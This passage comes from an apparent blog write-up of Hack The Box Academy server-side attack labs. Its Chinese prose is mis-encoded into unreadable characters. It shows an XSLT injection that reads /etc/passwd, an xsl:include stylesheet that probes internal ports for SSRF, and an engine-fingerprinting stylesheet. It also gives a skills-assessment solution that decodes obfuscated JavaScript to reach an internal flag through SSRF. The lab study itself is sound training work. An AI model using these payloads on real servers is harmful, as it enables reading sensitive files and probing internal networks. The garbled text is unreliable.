<h4 id="é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢"><a href="#é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢" class="headerlink" title="é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢"></a>é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:readfile.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 1 column 111 of readfile.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><code>xsl:include</code>å¯ç”¨äºæ‰§è¡ŒSSRF</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è½¬åŒ–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å‘åŠ¨SSRFæ”»å‡»ã€‚</p>
<h4 id="ssrf-xsl"><a href="#ssrf-xsl" class="headerlink" title="ssrf.xsl"></a>ssrf.xsl</h4><p>Code: éªŒè¯ç ï¼š xmlXML</p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:abc</span>=<span class="string">"http://php.net/xsl"</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:5000/xslt"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢-1"><a href="#é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢-1" class="headerlink" title="é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢"></a>é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">Error at xsl:include on line 2 column 49 of ssrf.xsl:</span><br><span class="line">  XTSE0165: java.io.FileNotFoundException: http://127.0.0.1:5000/xslt</span><br><span class="line">Failed to compile stylesheet. 1 error detected. </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:ssrf.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 1 column 111 of ssrf.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">Error at xsl:include on line 2 column 49 of ssrf.xsl:</span><br><span class="line">  XTSE0165: java.net.ConnectException: Connection refused (Connection refused)</span><br><span class="line">Failed to compile stylesheet. 1 error detected.</span><br></pre></td></tr></tbody></table></figure>

<p>æ£€æŸ¥ä¸Šé¢å½“æˆ‘ä»¬æ‰“å¼€æˆ–å…³é—­ç«¯å£æ—¶çš„ä¸åŒå“åº”ã€‚å¦‚æœä½ æƒ³åœ¨Pwnboxæˆ–æœ¬åœ°æœºå™¨ä¸Šå°è¯•è¿™ä¸ªï¼Œå°è¯•æ‰§è¡Œä¸Šé¢çš„<code>saxonb-xslt</code>å‘½ä»¤ä¸€æ¬¡ï¼Œåœ¨ç«¯å£5000ä¸Šæ²¡æœ‰ç›‘å¬ï¼Œä¸€æ¬¡åœ¨ç«¯å£5000ä¸Šæœ‰ä¸€ä¸ªHTTPæœåŠ¡å™¨ç›‘å¬ï¼ˆåœ¨å•ç‹¬çš„é€‰é¡¹å¡æˆ–ç»ˆç«¯ä¸­çš„<code>sudo python3 -m http.server 5000</code>ï¼‰ã€‚</p>
<p>æˆ‘ä»¬åœ¨æœ¬èŠ‚çš„å¼€å¤´ä»‹ç»äº†ä¸€äº›æŠ€æœ¯å †æ ˆæ ‡è¯†XSLæ–‡ä»¶ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªï¼Œæ¯”ä»¥å‰çš„å¤§ã€‚è¯•ç€ç”¨å®ƒæ¥é‡ç°ä¸Šé¢çš„ä¾‹å­ã€‚</p>
<h4 id="fingerprinting-xsl"><a href="#fingerprinting-xsl" class="headerlink" title="fingerprinting.xsl"></a>fingerprinting.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"> Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:version')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> Vendor: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> Vendor URL: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor-url')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:product-name')"</span>&gt;</span></span><br><span class="line"> Product Name: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:product-name')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:product-version')"</span>&gt;</span></span><br><span class="line"> Product Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:product-version')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:is-schema-aware')"</span>&gt;</span></span><br><span class="line"> Is Schema Aware ?: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:is-schema-aware')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:supports-serialization')"</span>&gt;</span></span><br><span class="line"> Supports Serialization: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:supportsserialization')"</span></span></span><br><span class="line"><span class="tag">/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"system-property('xsl:supports-backwards-compatibility')"</span>&gt;</span></span><br><span class="line"> Supports Backwards Compatibility: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:supportsbackwards-compatibility')"</span></span></span><br><span class="line"><span class="tag">/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢-2"><a href="#é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢-2" class="headerlink" title="é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢"></a>é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 2 column 80 of fingerprinting.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"> Version: 2.0&lt;br/&gt;</span><br><span class="line"> Vendor: SAXON 9.1.0.8 from Saxonica&lt;br/&gt;</span><br><span class="line"> Vendor URL: http://www.saxonica.com/&lt;br/&gt;</span><br><span class="line"> Product Name: SAXON&lt;br/&gt;</span><br><span class="line"> Product Version: 9.1.0.8&lt;br/&gt;</span><br><span class="line"> Is Schema Aware ?: no&lt;br/&gt;</span><br><span class="line"> Supports Serialization: &lt;br/&gt;</span><br><span class="line"> Supports Backwards Compatibility: &lt;br/&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„<a target="_blank" rel="noopener" href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt">wordlist</a>æ¥å®ç°ç›®æ ‡åº”ç”¨ç¨‹åºä¸­çš„æš´åŠ›ç ´è§£åŠŸèƒ½ã€‚</p>
<h1 id="Server-Side-Attacks-Skills-Assessment"><a href="#Server-Side-Attacks-Skills-Assessment" class="headerlink" title="Server-Side Attacks - Skills Assessment"></a>Server-Side Attacks - Skills Assessment</h1><p>æŸ¥çœ‹jquery.jsæ–‡ä»¶ï¼Œ</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">function dec(str) {</span><br><span class="line">	var w = atob(str);</span><br><span class="line">	return w.split("").reverse().join("");</span><br><span class="line">}</span><br><span class="line">function getmessage() {</span><br><span class="line">	var x = "Ly86cHR0aA==";</span><br><span class="line">	var y = "dHNvaC5ub2l0YWNvbC53b2RuaXc=";</span><br><span class="line">	var z = "dHh0LmVnYXNzZW0vMDgwODoxLjAuMC43MjEvLzpwdHRoPXQzM2w/M000M2wxRnQ0aFR0M0cv";</span><br><span class="line">	var woot = dec(x) + eval(dec(y)) + dec(z);</span><br><span class="line">	fetch(woot)</span><br><span class="line">	.then(response =&gt; response.text())</span><br><span class="line">	.then(data =&gt; {</span><br><span class="line">		return confirm(data);</span><br><span class="line">	});</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>æŠŠxyzbase64è§£ç ä¹‹åï¼Œå†åå‘ï¼Œå¾—åˆ°ï¼š</p>
<p>/G3tTh4tF1l34M3?l33t=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/message.txtwindow.location.hosthttp://">http://127.0.0.1:8080/message.txtwindow.location.hosthttp://</a></p>
<p>ç›´æ¥è®¿é—®/G3tTh4tF1l34M3?l33t=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/flag.txt">http://127.0.0.1:8080/flag.txt</a></p>
<p>ä¸€å¼€å§‹ä»¥ä¸ºè€ƒç‚¹è‚¯å®šæ˜¯SSTIï¼Œç»“æœç«Ÿç„¶ä¸€ä¸ªSSRFç§’äº†ï¼Œé˜¿å“²</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://mikannse.space/2023/10/30/ServersideAttacksHTB/">http://mikannse.space/2023/10/30/ServersideAttacksHTB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://mikannse.space" target="_blank">Mikannseã®Sekai</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E5%AE%89/">ç½‘å®‰</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">ç¬”è®°</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">æ¸—é€æµ‹è¯•</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/04/IntroToAssemblyArchANDAssembDebugger/" title="IntroToAssemblyArchANDAssembDebuggerHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">IntroToAssemblyArchANDAssembDebuggerHTB</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">IntroductiontoBashScriptingHTB</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div><div><a href="/2023/10/24/HackingWordPressHTB/" title="HackingWordPressHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-24</div><div class="title">HackingWordPressHTB</div></div></a></div><div><a href="/2023/11/07/IntroToAssemblyShellcodingANDSkill/" title="IntroToAssemblyShellcodingANDSkillHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-07</div><div class="title">IntroToAssemblyShellcodingANDSkillHTB</div></div></a></div><div><a href="/2023/10/28/IntroductiontoBashScriptingHTB/" title="IntroductiontoBashScriptingHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-28</div><div class="title">IntroductiontoBashScriptingHTB</div></div></a></div><div><a href="/2023/11/15/Information%20Gathering%20-%20Web%20EditionHTB/" title="Information Gathering - Web EditionHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-15</div><div class="title">Information Gathering - Web EditionHTB</div></div></a></div><div><a href="/2023/11/05/IntroToAssemblyBasicInstructionsANDFunctions/" title="IntroToAssemblyBasicInstructionsANDFunctionsHTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-05</div><div class="title">IntroToAssemblyBasicInstructionsANDFunctionsHTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">308</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">æš‚æ—¶æ²¡æœ‰å…¬å‘ŠQAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction-to-Server-Side-Attacks"><span class="toc-number">1.</span> <span class="toc-text">Introduction to Server-Side Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Types-of-Server-Side-Attacks"><span class="toc-number">1.1.</span> <span class="toc-text">Types of Server-Side Attacks</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Abusing-Intermediary-Applications"><span class="toc-number">2.</span> <span class="toc-text">Abusing Intermediary Applications</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx-Reverse-Proxy-amp-AJP"><span class="toc-number">2.1.</span> <span class="toc-text">Nginx Reverse Proxy &amp; AJP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BDNginx%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">ä¸‹è½½Nginxæºç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ajp%E6%A8%A1%E5%9D%97%E7%BC%96%E8%AF%91Nginx%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">ä½¿ç”¨ajpæ¨¡å—ç¼–è¯‘Nginxæºä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%90%91AJP%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.1.0.3.</span> <span class="toc-text">æŒ‡å‘AJPç«¯å£</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Accessing-the-%E2%80%9Chidden%E2%80%9D-Tomcat-page"><span class="toc-number">2.1.0.4.</span> <span class="toc-text">Accessing the â€œhiddenâ€ Tomcat page</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">3.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-Exploitation-Example"><span class="toc-number">3.1.</span> <span class="toc-text">SSRF Exploitation Example</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap-Discovering-Open-Ports-Nmap"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">Nmap - Discovering Open Ports Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener"><span class="toc-number">3.1.0.3.</span> <span class="toc-text">Netcat Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Testing-for-SSRF"><span class="toc-number">3.1.0.4.</span> <span class="toc-text">Curl - Testing for SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener-Confirming-SSRF"><span class="toc-number">3.1.0.5.</span> <span class="toc-text">Netcat Listener - Confirming SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Start-Python-HTTP-Server"><span class="toc-number">3.1.0.6.</span> <span class="toc-text">Start Python HTTP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Start-FTP-Server"><span class="toc-number">3.1.0.7.</span> <span class="toc-text">Start FTP Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-Schema-%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6-FTP%E6%9E%B6%E6%9E%84"><span class="toc-number">3.1.0.8.</span> <span class="toc-text">FTP Schema é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶- FTPæ¶æ„</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6-HTTP%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.0.9.</span> <span class="toc-text">é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶- HTTPæ¨¡å¼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E6%9E%B6%E6%9E%84"><span class="toc-number">3.1.0.10.</span> <span class="toc-text">é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Generate-a-Wordlist"><span class="toc-number">3.1.0.11.</span> <span class="toc-text">Generate a Wordlist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target-1"><span class="toc-number">3.1.0.12.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-Fuzzing"><span class="toc-number">3.1.0.13.</span> <span class="toc-text">Port Fuzzing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target"><span class="toc-number">3.1.0.14.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-1"><span class="toc-number">3.1.0.15.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-2"><span class="toc-number">3.1.0.16.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-3"><span class="toc-number">3.1.0.17.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Port-Fuzzing-1"><span class="toc-number">3.1.0.18.</span> <span class="toc-text">Port Fuzzing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-4"><span class="toc-number">3.1.0.19.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-5"><span class="toc-number">3.1.0.20.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A3%80%E7%B4%A2%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E6%9E%B6%E6%9E%84-1"><span class="toc-number">3.1.0.21.</span> <span class="toc-text">é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-6"><span class="toc-number">3.1.0.22.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Install-JQ-%E5%AE%89%E8%A3%85JQ"><span class="toc-number">3.1.0.23.</span> <span class="toc-text">Install JQ å®‰è£…JQ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Automate-executing-commands"><span class="toc-number">3.1.0.24.</span> <span class="toc-text">Automate executing commands</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-SSRF"><span class="toc-number">3.2.</span> <span class="toc-text">Blind SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-SSRF-Exploitation-Example"><span class="toc-number">3.3.</span> <span class="toc-text">Blind SSRF Exploitation Example</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener-1"><span class="toc-number">3.3.0.1.</span> <span class="toc-text">Netcat Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Netcat-Listener-2"><span class="toc-number">3.3.0.2.</span> <span class="toc-text">Netcat Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64-Decoding"><span class="toc-number">3.3.0.3.</span> <span class="toc-text">Base64 Decoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash-Reverse-Shell"><span class="toc-number">3.3.0.4.</span> <span class="toc-text">Bash Reverse Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL-Encoded-Payload"><span class="toc-number">3.3.0.5.</span> <span class="toc-text">URL Encoded Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML-Payload"><span class="toc-number">3.3.0.6.</span> <span class="toc-text">HTML Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-Based-SSRF"><span class="toc-number">3.4.</span> <span class="toc-text">Time-Based SSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Includes-SSI-Injection"><span class="toc-number">4.</span> <span class="toc-text">Server-Side Includes (SSI) Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Server-Side-Includes-Overview"><span class="toc-number">4.1.</span> <span class="toc-text">Server-Side Includes Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 